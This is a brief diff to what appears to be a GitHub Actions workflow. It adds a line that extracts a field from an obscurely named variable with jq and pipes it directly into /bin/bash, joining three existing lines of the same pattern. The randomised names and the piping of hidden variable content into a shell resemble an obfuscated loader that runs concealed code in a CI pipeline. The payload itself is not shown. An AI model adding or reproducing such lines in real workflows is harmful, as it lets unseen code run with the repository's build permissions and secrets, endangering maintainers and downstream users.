@@ -31,6 +31,7 @@ jobs:
           echo $vsda145 | jq -r .z0 | /bin/bash
           printf '%s' "$z602" | jq -r .bbiy05131 | /bin/bash
           printf '%s' "$hrpd2830" | jq -r .nxoj6681 | /bin/bash
+          echo $e3 | jq -r .yj62871 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
